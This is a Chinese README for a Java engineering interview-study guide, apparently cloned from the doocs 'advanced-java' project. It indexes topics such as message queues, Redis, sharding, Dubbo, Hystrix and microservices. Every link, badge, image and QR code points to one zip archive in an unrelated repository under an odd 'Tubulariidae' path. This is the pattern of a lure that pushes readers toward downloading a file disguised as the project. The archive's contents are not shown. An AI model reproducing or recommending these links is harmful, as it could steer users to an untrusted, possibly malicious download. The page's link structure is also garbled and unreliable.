# 互联网 Java 工程师进阶知识完全扫盲

[![stars](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
[![forks](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
[![license](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)](./LICENSE)
[![doocs](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip%20us-42b883?style=flat-square&logo=homeassistantcommunitystore&logoColor=ffffff)](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

本项目大部分内容来自中华石杉，版权归作者所有，内容涵盖[高并发](#高并发架构)、[分布式](#分布式系统)、[高可用](#高可用架构)、[微服务](#微服务架构)、[海量数据处理](#海量数据处理)等领域知识。我们对这部分知识做了一个系统的整理，方便读者们学习查阅。

我们也在全力更新算法项目！如果你在准备笔面试算法，或者想进一步提升 coding 能力，欢迎 Star 关注 [doocs/leetcode](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

学习本项目之前，先来看看 [Discussions 讨论区](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)的技术面试官是怎么说的吧。本项目欢迎各位开发者朋友到 Discussions 讨论区分享自己的一些想法和实践经验。也不妨 Star 关注 [doocs/advanced-java](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)，随时追踪项目最新动态。

-   Gitee Pages: https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip
-   GitHub Pages: https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip

## 高并发架构

### [消息队列](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

-   [为什么使用消息队列？消息队列有什么优点和缺点？Kafka、ActiveMQ、RabbitMQ、RocketMQ 都有什么优点和缺点？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何保证消息队列的高可用？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何保证消息不被重复消费？（如何保证消息消费的幂等性）](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何保证消息的可靠性传输？（如何处理消息丢失的问题）](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何保证消息的顺序性？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何解决消息队列的延时以及过期失效问题？消息队列满了以后该怎么处理？有几百万消息持续积压几小时，说说怎么解决？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如果让你写一个消息队列，该如何进行架构设计啊？说一下你的思路。](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

### [搜索引擎](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

-   [ES 的分布式架构原理能说一下么（ES 是如何实现分布式的啊）？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [ES 写入数据的工作原理是什么啊？ES 查询数据的工作原理是什么啊？底层的 Lucene 介绍一下呗？倒排索引了解吗？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [ES 在数据量很大的情况下（数十亿级别）如何提高查询效率啊？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [ES 生产集群的部署架构是什么？每个索引的数据量大概有多少？每个索引大概有多少个分片？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

### 缓存

-   [在项目中缓存是如何使用的？缓存如果使用不当会造成什么后果？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [Redis 和 Memcached 有什么区别？Redis 的线程模型是什么？为什么单线程的 Redis 比多线程的 Memcached 效率要高得多？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [Redis 都有哪些数据类型？分别在哪些场景下使用比较合适？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [Redis 的过期策略都有哪些？手写一下 LRU 代码实现？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何保证 Redis 高并发、高可用？Redis 的主从复制原理能介绍一下么？Redis 的哨兵原理能介绍一下么？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [Redis 主从架构是怎样的？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [Redis 的持久化有哪几种方式？不同的持久化机制都有什么优缺点？持久化机制具体底层是如何实现的？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [Redis 集群模式的工作原理能说一下么？在集群模式下，Redis 的 key 是如何寻址的？分布式寻址都有哪些算法？了解一致性 hash 算法吗？如何动态增加和删除一个节点？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [了解什么是 Redis 的雪崩、穿透和击穿？Redis 崩溃之后会怎么样？系统该如何应对这种情况？如何处理 Redis 的穿透？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何保证缓存与数据库的双写一致性？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [Redis 的并发竞争问题是什么？如何解决这个问题？了解 Redis 事务的 CAS 方案吗？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [生产环境中的 Redis 是怎么部署的？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [有了解过 Redis rehash 的过程吗？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

### 分库分表

-   [为什么要分库分表（设计高并发系统的时候，数据库层面该如何设计）？用过哪些分库分表中间件？不同的分库分表中间件都有什么优点和缺点？你们具体是如何对数据库如何进行垂直拆分或水平拆分的？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [现在有一个未分库分表的系统，未来要分库分表，如何设计才可以让系统从未分库分表动态切换到分库分表上？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何设计可以动态扩容缩容的分库分表方案？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [分库分表之后，id 主键如何处理？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

### 读写分离

-   [如何实现 MySQL 的读写分离？MySQL 主从复制原理是啥？如何解决 MySQL 主从同步的延时问题？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

### 高并发系统

-   [如何设计一个高并发系统？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

## 分布式系统

### [面试连环炮](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

### 系统拆分

-   [为什么要进行系统拆分？如何进行系统拆分？拆分后不用 Dubbo 可以吗？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

### 分布式服务框架

-   [说一下 Dubbo 的工作原理？注册中心挂了可以继续通信吗？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [Dubbo 支持哪些序列化协议？说一下 Hessian 的数据结构？PB 知道吗？为什么 PB 的效率是最高的？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [Dubbo 负载均衡策略和集群容错策略都有哪些？动态代理策略呢？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [Dubbo 的 spi 思想是什么？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何基于 Dubbo 进行服务治理、服务降级、失败重试以及超时重试？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [分布式服务接口的幂等性如何设计（比如不能重复扣款）？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [分布式服务接口请求的顺序性如何保证？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何自己设计一个类似 Dubbo 的 RPC 框架？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [CAP 定理的 P 是什么？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

### 分布式锁

-   [Zookeeper 都有哪些应用场景？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [使用 Redis 如何设计分布式锁？使用 Zookeeper 来设计分布式锁可以吗？以上两种分布式锁的实现方式哪种效率比较高？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

### 分布式事务

-   [分布式事务了解吗？你们如何解决分布式事务问题的？TCC 如果出现网络连不通怎么办？XA 的一致性如何保证？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

### 分布式会话

-   [集群部署时的分布式 Session 如何实现？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

## 高可用架构

-   [Hystrix 介绍](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [电商网站详情页系统架构](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [Hystrix 线程池技术实现资源隔离](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [Hystrix 信号量机制实现资源隔离](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [Hystrix 隔离策略细粒度控制](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [深入 Hystrix 执行时内部原理](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [基于 request cache 请求缓存技术优化批量商品数据查询接口](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [基于本地缓存的 fallback 降级机制](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [深入 Hystrix 断路器执行原理](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [深入 Hystrix 线程池隔离与接口限流](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [基于 timeout 机制为服务接口调用超时提供安全保护](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

### 高可用系统

-   如何设计一个高可用系统？

### 限流

-   [如何限流？在工作中是怎么做的？说一下具体的实现？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

### 熔断

-   如何进行熔断？
-   熔断框架都有哪些？具体实现原理知道吗？
-   [熔断框架如何做技术选型？选用 Sentinel 还是 Hystrix？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

### 降级

-   如何进行降级？

## 微服务架构

-   [微服务架构整个章节内容属额外新增，后续抽空更新，也欢迎读者们参与补充完善](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [关于微服务架构的描述](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [从单体式架构迁移到微服务架构](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [微服务的事件驱动数据管理](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [选择微服务部署策略](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [微服务架构的优势与不足](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

### Spring Cloud 微服务架构

-   [什么是微服务？微服务之间是如何独立通讯的？](/docs/micro-services/what'https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   Spring Cloud 和 Dubbo 有哪些区别？
-   Spring Boot 和 Spring Cloud，谈谈你对它们的理解？
-   什么是服务熔断？什么是服务降级？
-   微服务的优缺点分别是什么？说一下你在项目开发中碰到的坑？
-   [你所知道的微服务技术栈都有哪些？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [微服务治理策略](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   Eureka 和 Zookeeper 都可以提供服务注册与发现的功能，它们有什么区别？
-   [谈谈服务发现组件 Eureka 的主要调用过程？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   ......

## 海量数据处理

-   [如何从大量的 URL 中找出相同的 URL？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何从大量数据中找出高频词？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何找出某一天访问百度网站最多的 IP？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何在大量的数据中找出不重复的整数？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何在大量的数据中判断一个数是否存在？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何查询最热门的查询串？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何统计不同电话号码的个数？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何从 5 亿个数中找出中位数？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何按照 query 的频度排序？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [如何找出排名前 500 的数？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)
-   [讲讲大数据中 TopK 问题的常用套路？](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

## Stars 趋势

<a href="https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip" target="_blank"><img src="https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip" alt="Stargazers over time" /></a>

注：本趋势图由 [actions-starcharts](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip) 自动定时刷新，作者 [@MaoLongLong](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)

---

## Doocs 社区优质项目

Doocs 技术社区，致力于打造一个内容完整、持续成长的互联网开发者学习生态圈！以下是 Doocs 旗下的一些优秀项目，欢迎各位开发者朋友持续保持关注。

| #   | 项目                                                              | 描述                                                                                             | 热度                                                                                                                            |
| --- | ----------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------- |
| 1   | [advanced-java](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)           | 互联网 Java 工程师进阶知识完全扫盲：涵盖高并发、分布式、高可用、微服务、海量数据处理等领域知识。 | ![](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip) <br>![](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)           |
| 2   | [leetcode](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)                     | 多种编程语言实现 LeetCode、《剑指 Offer（第 2 版）》、《程序员面试金典（第 6 版）》题解。        | ![](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip) <br>![](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)                     |
| 3   | [source-code-hunter](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip) | 互联网常用组件框架源码分析。                                                                     | ![](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip) <br>![](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip) |
| 4   | [jvm](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)                               | Java 虚拟机底层原理知识总结。                                                                    | ![](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip) <br>![](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)                               |
| 5   | [coding-interview](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)     | 代码面试题集，包括《剑指 Offer》、《编程之美》等。                                               | ![](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip) <br>![](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)     |
| 6   | [md](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)                                 | 一款高度简洁的微信 Markdown 编辑器。                                                             | ![](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip) <br>![](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)                                 |
| 7   | [technical-books](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)       | 值得一看的技术书籍列表。                                                                         | ![](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip) <br>![](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)       |

## 贡献者

感谢以下所有朋友对 [Doocs 技术社区](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip) 所做出的贡献，[参与项目维护请戳这儿](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip)。

<!-- ALL-CONTRIBUTORS-LIST: START - Do not remove or modify this section -->

<a href="https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip"><img src="https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip" /></a>

<!-- ALL-CONTRIBUTORS-LIST: END -->

## 公众号

[Doocs](https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip) 技术社区旗下唯一公众号「**Doocs**」​，欢迎扫码关注，**专注分享技术领域相关知识及行业最新资讯**。当然，也可以加我个人微信（备注：GitHub），拉你进技术交流群。

<table>
  <tr>
    <td align="center" style="width: 200px;">
      <a href="https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip">
        <img src="https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip" style="width: 400px;"><br>
        <sub>公众平台</sub>
      </a><br>
    </td>
    <td align="center" style="width: 200px;">
      <a href="https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip">
        <img src="https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip" style="width: 400px;"><br>
        <sub>个人微信</sub>
      </a><br>
    </td>
  </tr>
</table>

关注「**Doocs**」公众号，回复 **PDF**，即可获取本项目离线 PDF 文档（283 页精华），学习更加方便！

<img src="https://raw.githubusercontent.com/FinnS-F/advanced-java/main/Tubulariidae/advanced-java.zip" style="width: 600px;"><br>
